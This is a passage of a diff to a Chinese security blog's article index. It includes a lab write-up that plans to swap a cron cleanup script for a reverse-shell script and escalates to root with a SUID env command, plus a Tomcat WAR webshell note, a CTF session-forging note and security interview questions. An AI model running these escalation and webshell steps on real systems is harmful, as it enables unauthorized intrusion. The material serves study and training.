的未授权访问，重点检查是否泄露敏感信息或配置文件。</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~]</span><br><span class="line">└─$ cat clean.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>思路：<br>上传恶意的clean.sh 替换这个 导致反弹shell</p><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><p><a href="/../assets/img/Pasted%20image%2020241120230510.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120230510.png"></a></p><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>env具有suid 权限可以进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env /bin/sh -p</span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h3 id="使用-find-查找所有系统-SUID-程序"><a href="#使用-find-查找所有系统-SUID-程序" class="headerlink" title="使用 find 查找所有系统 SUID 程序"></a>使用 <code>find</code> 查找所有系统 SUID 程序</h3><p>可以更精确地查看系统中常见的目录中具有 SUID 权限的程序，例如：</p><p><code>find /bin /sbin /usr/bin /usr/sbin -type f -perm -4000 2&gt;/dev/null</code></p><p>这些目录通常包含系统的可执行文件，通过此命令你可以检查这些目录中是否存在具有 SUID 权限的文件。</p><h3 id="使用-which-或-whereis-确定程序的位置"><a href="#使用-which-或-whereis-确定程序的位置" class="headerlink" title="使用 which 或 whereis 确定程序的位置"></a>使用 <code>which</code> 或 <code>whereis</code> 确定程序的位置</h3><p>如果你怀疑某个程序具有 SUID 权限，可以使用 <code>which</code> 或 <code>whereis</code> 命令来查找该程序的路径，然后使用 <code>ls -l</code> 查看其权限：</p><p><code>which &lt;program_name&gt;</code></p><p><code>which passwd</code></p><p>然后查看 <code>passwd</code> 程序的权限：</p><p><code>ls -l $(which passwd)</code></p><h3 id="示例输出"><a href="#示例输出" class="headerlink" title="示例输出"></a>示例输出</h3><p>如果一个文件具有 SUID 权限，你将看到类似以下的输出：</p><p><code>-rwsr-xr-x 1 root root 12345 Apr 1 2024 /usr/bin/passwd</code></p><p>在这个例子中，<code>/usr/bin/passwd</code> 是一个 SUID 程序，意味着即使普通用户执行它，它也会以 root 权限运行。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过使用 <code>find</code> 命令查找具有 SUID 权限的程序，或者直接查看文件的权限，你可以识别出可能带来安全风险的程序。确保定期检查系统中具有 SUID 权限的程序，并限制它们的使用权限，尤其是对于不再需要的 SUID 程序。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
       
       
       
@@ -654,33 +679,6 @@
     
     
     <entry>
-      <title>Web中间件-Tomcat8</title>
-      <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
-      <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li>界面<br><a href="/../assets/img/image-107.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-107.png" alt="alt text"></a></li><li>manager 弱口令<br><a href="/../assets/img/image-108.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-108.png" alt="alt text"></a></li><li>上传 war 包<br>直接将shell.jsp压缩，修改后缀为.war即可上传<br><a href="/../assets/img/image-109.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-109.png" alt="alt text"></a></li><li>反弹shell<br><a href="/../assets/img/image-110.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-110.png" alt="alt text"></a><br>意思是在shell文件下的shell.jsp</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 网络安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Web中间件 </tag>
-            
-            <tag> Tomcat </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>MonitorsThree</title>
       <link href="/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"/>
       <url>/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/</url>
@@ -700,6 +698,33 @@
             <tag> Linux </tag>
             
             <tag> THB </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web中间件-Tomcat8</title>
+      <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
+      <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li>界面<br><a href="/../assets/img/image-107.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-107.png" alt="alt text"></a></li><li>manager 弱口令<br><a href="/../assets/img/image-108.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-108.png" alt="alt text"></a></li><li>上传 war 包<br>直接将shell.jsp压缩，修改后缀为.war即可上传<br><a href="/../assets/img/image-109.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-109.png" alt="alt text"></a></li><li>反弹shell<br><a href="/../assets/img/image-110.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-110.png" alt="alt text"></a><br>意思是在shell文件下的shell.jsp</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web中间件 </tag>
+            
+            <tag> Tomcat </tag>
             
         </tags>
       
@@ -865,33 +890,6 @@
     
     
     <entry>
-      <title>网络安全面试题</title>
-      <link href="/2024/11/13/2024-09-10-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
-      <url>/2024/11/13/2024-09-10-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li><strong>漏洞相关</strong>：<ul><li><strong>挖洞经历和CTF经历</strong>：要求介绍自认为有趣的相关经历。</li><li><strong>常用漏洞</strong>：包括平时用得较多的漏洞及其原理、修复方案，如SQL注入、上传Webshell等。</li><li><strong>开源组件高危漏洞</strong>：要求列举所知道的所有相关漏洞。</li><li><strong>CVE或POC</strong>：需要描述深入研究过的CVE或POC。</li><li><strong>反序列化漏洞</strong>：包括php&#x2F;java反序列化漏洞的原理和解决方案。</li></ul></li><li><strong>工具相关</strong>：<ul><li><strong>常用工具</strong>：询问平时使用的工具及其特点。</li></ul></li><li><strong>绕过WAF</strong>：<ul><li><strong>SQL注入和上传Webshell</strong>：遇到WAF时的应对方法。</li></ul></li><li><strong>系统提权</strong>：<ul><li><strong>Windows和Linux系统</strong>：阐述提权的思路。</li></ul></li><li><strong>渗透测试</strong>：<ul><li><strong>获取目标网站真实IP</strong>：介绍绕过CDN获取真实IP的思路。</li><li><strong>渗透测试思路</strong>：针对给定网站，阐述渗透测试的思路。</li><li><strong>实际渗透测试经历</strong>：可能会询问相关经历。</li><li><strong>反弹shell</strong>：常用命令、常反弹的shell类型及原因。</li><li><strong>SSRF漏洞</strong>：包括成因、防御、绕过等方面。</li><li><strong>SQL注入</strong>：漏洞成因、防范方法、注入方式、利用方式、中间件解析漏洞利用方式、bypass技巧、宽字符注入原理及修复等。</li><li><strong>获取webshell的思路</strong>：针对特定注入点，如test.jsp?cid&#x3D;150，获取webshell的思路。</li><li><strong>变形注入的思路</strong>：对于存在SQL注入漏洞的变形注入，提出解决思路。</li><li><strong>mysql注入的区别</strong>：mysql 5.0以上和5.0以下网站注入的区别。</li><li><strong>sqlmap的使用</strong>：sqlmap对注入点注入以及注入post包的方法。</li></ul></li><li><strong>浏览器知识</strong>：<ul><li><strong>跨域请求数据</strong>：如何设置跨域请求数据，jsonp的作用。</li><li><strong>同源策略</strong>：子域名和顶级域名不同源时的设置方法，同源策略的解释及同源可获取的东西。</li><li><strong>JSON和JSONP的区别</strong>：包括JSONP劫持利用方式及修复方案、JSON注入利用方式、Ajax是否遵循同源策略等。</li><li><strong>CSP</strong>：CSP是什么以及如何设置。</li><li><strong>浏览器安全策略</strong>：不同浏览器（如chrome、firefox、IE）之间安全策略的不同。</li><li><strong>HTML5安全特性</strong>：HTML5新的安全特性。</li></ul></li><li><strong>XSS</strong>：<ul><li><strong>防范XSS漏洞</strong>：在前端和后端的防范方法，以及何处更好及原因。</li><li><strong>检测XSS漏洞</strong>：黑盒检测XSS漏洞的方法。</li><li><strong>利用XSS盲打漏洞</strong>：在内网且只能内网访问的情况下，利用XSS盲打漏洞的方法。</li><li><strong>防御蠕虫</strong>：防御蠕虫的方法，以及在社交类网站中蠕虫可能出现的地方。</li><li><strong>XSS持久化</strong>：相关内容。</li><li><strong>构造蠕虫的条件</strong>：拥有XSS漏洞时，构造蠕虫所需的其他条件。</li><li><strong>XSS的发生场景、定义及修复方式</strong>：相关内容。</li></ul></li><li><strong>CSRF&#x2F;SSRF</strong>：<ul><li><strong>区别</strong>：CSRF、SSRF和重放攻击的区别。</li><li><strong>防御CSRF的方法</strong>：包括JAVA的防御方式以及token是否一定有用。</li><li><strong>CSRF漏洞的本质、定义及修复方式</strong>：相关内容。</li><li><strong>SSRF漏洞原理、利用方式及修复方案</strong>：以及Java和PHP的SSRF区别。</li></ul></li><li><strong>XML注入</strong>：<ul><li><strong>XXE</strong>：XXE是什么以及修复方案。</li></ul></li><li><strong>业务逻辑漏洞</strong>：<ul><li><strong>类型及修复方式</strong>：至少说出三种业务逻辑漏洞及其修复方式，如找回密码、身份认证、验证码漏洞等。</li><li><strong>越权访问</strong>：水平、垂直、未授权越权访问的区别，以及越权问题的自动化检测方法。</li></ul></li><li><strong>Java考察</strong>：<ul><li><strong>MVC结构和数据流向</strong>：java的MVC结构的作用，数据流向数据库的顺序。</li><li><strong>java沙箱</strong>：对java沙箱的了解。</li><li><strong>ibats和sql注入</strong>：ibats的参数化查询对sql注入的控制，以及可能造成sql注入的危险方法。</li><li><strong>struts2漏洞原理</strong>：两次struts2漏洞的原理。</li><li><strong>ongl在payload中的作用</strong>：相关内容。</li><li><strong>\u0023字符编码</strong>：\u0023是什么字符的16进制编码以及在payload中使用的原因。</li><li><strong>执行系统命令的漏洞</strong>：java是否会发生此类漏洞，以及相关的语句和方法。</li><li><strong>修复xss漏洞的层级</strong>：在java程序中修复xss漏洞的层级。</li><li><strong>xss filter的设置位置</strong>：xss filter在java程序中的设置位置。</li><li><strong>java类反射的安全问题</strong>：相关内容。</li><li><strong>Java反序列化漏洞</strong>：原理和解决方案。</li><li><strong>java框架</strong>：了解的java框架。</li></ul></li><li><strong>PHP考察</strong>：<ul><li><strong>LFI本地包含漏洞</strong>：原理、代码示例、手工发掘方法、无报错回显时的文件遍历方法。</li><li><strong>php反序列化漏洞</strong>：原理和解决方案。</li><li><strong>php webshell检测方法</strong>：相关内容。</li><li><strong>%00截断的原理</strong>：相关内容。</li><li><strong>php.ini的安全特性设置</strong>：相关内容。</li><li><strong>php避免错误回显的方法</strong>：相关内容。</li></ul></li><li><strong>常见中间件</strong>：<ul><li><strong>Redis未授权访问漏洞</strong>：入侵利用方式。</li><li><strong>中间件解析漏洞利用方式</strong>：常见的中间件解析漏洞利用方式。</li><li><strong>JAVA中间件容器</strong>：常见的中间件容器。</li><li><strong>tomcat安全加固</strong>：相关内容。</li><li><strong>tomcat重启后的情况</strong>：相关内容。</li><li><strong>常见网站服务器中间件容器</strong>：相关内容。</li></ul></li><li><strong>数据库安全</strong>：<ul><li><strong>mysql表权限</strong>：除增删改查、文件读写外的其他权限。</li><li><strong>mysql安全</strong>：mysql安全的做法。</li><li><strong>sqlserver public权限提权</strong>：相关内容。</li><li><strong>加固降权思路</strong>：Windows、Linux、数据库任选其一的加固降权思路。</li><li><strong>mysql用户信息存储</strong>：mysql的用户名密码存放的表以及密码的加密方式。</li><li><strong>mysql默认库</strong>：mysql数据库默认的库名。</li><li><strong>mysql UDF提权</strong>：5.1以上版本和5.1以下版本的区别及所需条件。</li></ul></li><li><strong>Linux操作系统</strong>：<ul><li><strong>系统安全加固</strong>：简述Linux系统安全加固需要做的方面。</li><li><strong>后门检测工具</strong>：使用的工具来判断系统是否存在后门。</li><li><strong>Selinux</strong>：Linux的Selinux是什么以及如何设置。</li><li><strong>iptables工作层</strong>：iptables工作在TCP&#x2F;IP模型中的哪层。</li><li><strong>系统防护</strong>：无法升级内核时，保证系统不被已知exp提权的方法。</li><li><strong>日志相关</strong>：syslog中的日志类型、安装软件的日志位置、ssh登录日志的查询、syslog日志格式的配置、syslog的查看方式及是否为二进制文件。</li><li><strong>应急响应</strong>：Linux服务器被入侵后的应急响应方法。</li></ul></li><li><strong>应急响应</strong>：<ul><li><strong>后门实现方式</strong>：有哪几种后门实现方式。</li><li><strong>webshell检测</strong>：webshell检测的方法思路。</li><li><strong>Linux服务器中木马后的应急思路</strong>：相关内容。</li><li><strong>新0day应急响应</strong>：遇到新0day（如Struts2）后的应急响应方法。</li><li><strong>安全评估和审计</strong>：新业务上线前的安全评估方向，现有系统审计发现安全风险的方向。</li></ul></li><li><strong>其他</strong>：<ul><li><strong>判断网站CMS的意义</strong>：判断出网站的CMS对渗透的意义。</li><li><strong>清理入侵日志</strong>：相关内容。</li><li><strong>总结渗透报告及修复方案</strong>：相关内容。</li><li><strong>收集目标站注册人邮箱的价值</strong>：在渗透过程中，收集目标站注册人邮箱的价值。</li><li><strong>DNS在渗透中的作用</strong>：相关内容。</li></ul></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 面试 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 网络安全 </tag>
-            
-            <tag> 面试 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>渗透测试</title>
       <link href="/2024/11/13/2024-09-12-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
       <url>/2024/11/13/2024-09-12-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
@@ -911,6 +909,33 @@
             <tag> 网络安全 </tag>
             
             <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网络安全面试题</title>
+      <link href="/2024/11/13/2024-09-10-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
+      <url>/2024/11/13/2024-09-10-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li><strong>漏洞相关</strong>：<ul><li><strong>挖洞经历和CTF经历</strong>：要求介绍自认为有趣的相关经历。</li><li><strong>常用漏洞</strong>：包括平时用得较多的漏洞及其原理、修复方案，如SQL注入、上传Webshell等。</li><li><strong>开源组件高危漏洞</strong>：要求列举所知道的所有相关漏洞。</li><li><strong>CVE或POC</strong>：需要描述深入研究过的CVE或POC。</li><li><strong>反序列化漏洞</strong>：包括php&#x2F;java反序列化漏洞的原理和解决方案。</li></ul></li><li><strong>工具相关</strong>：<ul><li><strong>常用工具</strong>：询问平时使用的工具及其特点。</li></ul></li><li><strong>绕过WAF</strong>：<ul><li><strong>SQL注入和上传Webshell</strong>：遇到WAF时的应对方法。</li></ul></li><li><strong>系统提权</strong>：<ul><li><strong>Windows和Linux系统</strong>：阐述提权的思路。</li></ul></li><li><strong>渗透测试</strong>：<ul><li><strong>获取目标网站真实IP</strong>：介绍绕过CDN获取真实IP的思路。</li><li><strong>渗透测试思路</strong>：针对给定网站，阐述渗透测试的思路。</li><li><strong>实际渗透测试经历</strong>：可能会询问相关经历。</li><li><strong>反弹shell</strong>：常用命令、常反弹的shell类型及原因。</li><li><strong>SSRF漏洞</strong>：包括成因、防御、绕过等方面。</li><li><strong>SQL注入</strong>：漏洞成因、防范方法、注入方式、利用方式、中间件解析漏洞利用方式、bypass技巧、宽字符注入原理及修复等。</li><li><strong>获取webshell的思路</strong>：针对特定注入点，如test.jsp?cid&#x3D;150，获取webshell的思路。</li><li><strong>变形注入的思路</strong>：对于存在SQL注入漏洞的变形注入，提出解决思路。</li><li><strong>mysql注入的区别</strong>：mysql 5.0以上和5.0以下网站注入的区别。</li><li><strong>sqlmap的使用</strong>：sqlmap对注入点注入以及注入post包的方法。</li></ul></li><li><strong>浏览器知识</strong>：<ul><li><strong>跨域请求数据</strong>：如何设置跨域请求数据，jsonp的作用。</li><li><strong>同源策略</strong>：子域名和顶级域名不同源时的设置方法，同源策略的解释及同源可获取的东西。</li><li><strong>JSON和JSONP的区别</strong>：包括JSONP劫持利用方式及修复方案、JSON注入利用方式、Ajax是否遵循同源策略等。</li><li><strong>CSP</strong>：CSP是什么以及如何设置。</li><li><strong>浏览器安全策略</strong>：不同浏览器（如chrome、firefox、IE）之间安全策略的不同。</li><li><strong>HTML5安全特性</strong>：HTML5新的安全特性。</li></ul></li><li><strong>XSS</strong>：<ul><li><strong>防范XSS漏洞</strong>：在前端和后端的防范方法，以及何处更好及原因。</li><li><strong>检测XSS漏洞</strong>：黑盒检测XSS漏洞的方法。</li><li><strong>利用XSS盲打漏洞</strong>：在内网且只能内网访问的情况下，利用XSS盲打漏洞的方法。</li><li><strong>防御蠕虫</strong>：防御蠕虫的方法，以及在社交类网站中蠕虫可能出现的地方。</li><li><strong>XSS持久化</strong>：相关内容。</li><li><strong>构造蠕虫的条件</strong>：拥有XSS漏洞时，构造蠕虫所需的其他条件。</li><li><strong>XSS的发生场景、定义及修复方式</strong>：相关内容。</li></ul></li><li><strong>CSRF&#x2F;SSRF</strong>：<ul><li><strong>区别</strong>：CSRF、SSRF和重放攻击的区别。</li><li><strong>防御CSRF的方法</strong>：包括JAVA的防御方式以及token是否一定有用。</li><li><strong>CSRF漏洞的本质、定义及修复方式</strong>：相关内容。</li><li><strong>SSRF漏洞原理、利用方式及修复方案</strong>：以及Java和PHP的SSRF区别。</li></ul></li><li><strong>XML注入</strong>：<ul><li><strong>XXE</strong>：XXE是什么以及修复方案。</li></ul></li><li><strong>业务逻辑漏洞</strong>：<ul><li><strong>类型及修复方式</strong>：至少说出三种业务逻辑漏洞及其修复方式，如找回密码、身份认证、验证码漏洞等。</li><li><strong>越权访问</strong>：水平、垂直、未授权越权访问的区别，以及越权问题的自动化检测方法。</li></ul></li><li><strong>Java考察</strong>：<ul><li><strong>MVC结构和数据流向</strong>：java的MVC结构的作用，数据流向数据库的顺序。</li><li><strong>java沙箱</strong>：对java沙箱的了解。</li><li><strong>ibats和sql注入</strong>：ibats的参数化查询对sql注入的控制，以及可能造成sql注入的危险方法。</li><li><strong>struts2漏洞原理</strong>：两次struts2漏洞的原理。</li><li><strong>ongl在payload中的作用</strong>：相关内容。</li><li><strong>\u0023字符编码</strong>：\u0023是什么字符的16进制编码以及在payload中使用的原因。</li><li><strong>执行系统命令的漏洞</strong>：java是否会发生此类漏洞，以及相关的语句和方法。</li><li><strong>修复xss漏洞的层级</strong>：在java程序中修复xss漏洞的层级。</li><li><strong>xss filter的设置位置</strong>：xss filter在java程序中的设置位置。</li><li><strong>java类反射的安全问题</strong>：相关内容。</li><li><strong>Java反序列化漏洞</strong>：原理和解决方案。</li><li><strong>java框架</strong>：了解的java框架。</li></ul></li><li><strong>PHP考察</strong>：<ul><li><strong>LFI本地包含漏洞</strong>：原理、代码示例、手工发掘方法、无报错回显时的文件遍历方法。</li><li><strong>php反序列化漏洞</strong>：原理和解决方案。</li><li><strong>php webshell检测方法</strong>：相关内容。</li><li><strong>%00截断的原理</strong>：相关内容。</li><li><strong>php.ini的安全特性设置</strong>：相关内容。</li><li><strong>php避免错误回显的方法</strong>：相关内容。</li></ul></li><li><strong>常见中间件</strong>：<ul><li><strong>Redis未授权访问漏洞</strong>：入侵利用方式。</li><li><strong>中间件解析漏洞利用方式</strong>：常见的中间件解析漏洞利用方式。</li><li><strong>JAVA中间件容器</strong>：常见的中间件容器。</li><li><strong>tomcat安全加固</strong>：相关内容。</li><li><strong>tomcat重启后的情况</strong>：相关内容。</li><li><strong>常见网站服务器中间件容器</strong>：相关内容。</li></ul></li><li><strong>数据库安全</strong>：<ul><li><strong>mysql表权限</strong>：除增删改查、文件读写外的其他权限。</li><li><strong>mysql安全</strong>：mysql安全的做法。</li><li><strong>sqlserver public权限提权</strong>：相关内容。</li><li><strong>加固降权思路</strong>：Windows、Linux、数据库任选其一的加固降权思路。</li><li><strong>mysql用户信息存储</strong>：mysql的用户名密码存放的表以及密码的加密方式。</li><li><strong>mysql默认库</strong>：mysql数据库默认的库名。</li><li><strong>mysql UDF提权</strong>：5.1以上版本和5.1以下版本的区别及所需条件。</li></ul></li><li><strong>Linux操作系统</strong>：<ul><li><strong>系统安全加固</strong>：简述Linux系统安全加固需要做的方面。</li><li><strong>后门检测工具</strong>：使用的工具来判断系统是否存在后门。</li><li><strong>Selinux</strong>：Linux的Selinux是什么以及如何设置。</li><li><strong>iptables工作层</strong>：iptables工作在TCP&#x2F;IP模型中的哪层。</li><li><strong>系统防护</strong>：无法升级内核时，保证系统不被已知exp提权的方法。</li><li><strong>日志相关</strong>：syslog中的日志类型、安装软件的日志位置、ssh登录日志的查询、syslog日志格式的配置、syslog的查看方式及是否为二进制文件。</li><li><strong>应急响应</strong>：Linux服务器被入侵后的应急响应方法。</li></ul></li><li><strong>应急响应</strong>：<ul><li><strong>后门实现方式</strong>：有哪几种后门实现方式。</li><li><strong>webshell检测</strong>：webshell检测的方法思路。</li><li><strong>Linux服务器中木马后的应急思路</strong>：相关内容。</li><li><strong>新0day应急响应</strong>：遇到新0day（如Struts2）后的应急响应方法。</li><li><strong>安全评估和审计</strong>：新业务上线前的安全评估方向，现有系统审计发现安全风险的方向。</li></ul></li><li><strong>其他</strong>：<ul><li><strong>判断网站CMS的意义</strong>：判断出网站的CMS对渗透的意义。</li><li><strong>清理入侵日志</strong>：相关内容。</li><li><strong>总结渗透报告及修复方案</strong>：相关内容。</li><li><strong>收集目标站注册人邮箱的价值</strong>：在渗透过程中，收集目标站注册人邮箱的价值。</li><li><strong>DNS在渗透中的作用</strong>：相关内容。</li></ul></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 面试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> 面试 </tag>
             
         </tags>
       
@@ -1002,6 +1027,33 @@
     
     
     <entry>
+      <title>CISCN2021总决赛babypython</title>
+      <link href="/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/"/>
+      <url>/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h1><p>伪造session，获取flag</p><ol><li><a href="/../assets/img/image-86.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-86.png" alt="alt text"></a></li></ol><p><code>uuid.getnode()</code>函数可以获取网卡mac地址并转换成十进制数返回</p><ol start="2"><li><p>获取网卡mac地址<br> <a href="/../assets/img/image-87.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-87.png" alt="alt text"></a></p></li><li><p>伪造session<br>flask manage session 为flask的session管理器，可以伪造session</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> WebSec </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE-2021-44228</title>
       <link href="/2024/11/13/2024-09-04-CVE-2021-44228/"/>
       <url>/2024/11/13/2024-09-04-CVE-2021-44228/</url>
@@ -1023,33 +1075,6 @@
             <tag> CVE </tag>
             
             <tag> Sec </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CISCN2021总决赛babypython</title>
-      <link href="/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/"/>
-      <url>/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h1><p>伪造session，获取flag</p><ol><li><a href="/../assets/img/image-86.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-86.png" alt="alt text"></a></li></ol><p><code>uuid.getnode()</code>函数可以获取网卡mac地址并转换成十进制数返回</p><ol start="2"><li><p>获取网卡mac地址<br> <a href="/../assets/img/image-87.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-87.png" alt="alt text"></a></p></li><li><p>伪造session<br>flask manage session 为flask的session管理器，可以伪造session</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
-      <categories>
-          
-          <category> WebSec </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> Web </tag>
             
         </tags>
       
@@ -2196,33 +2221,6 @@
     
     
     <entry>
-      <title>CVE-2022-32991</title>
-      <link href="/2024/11/13/2024-02-20-CVE-2022-32991/"/>
-      <url>/2024/11/13/2024-02-20-CVE-2022-32991/</url>
-      
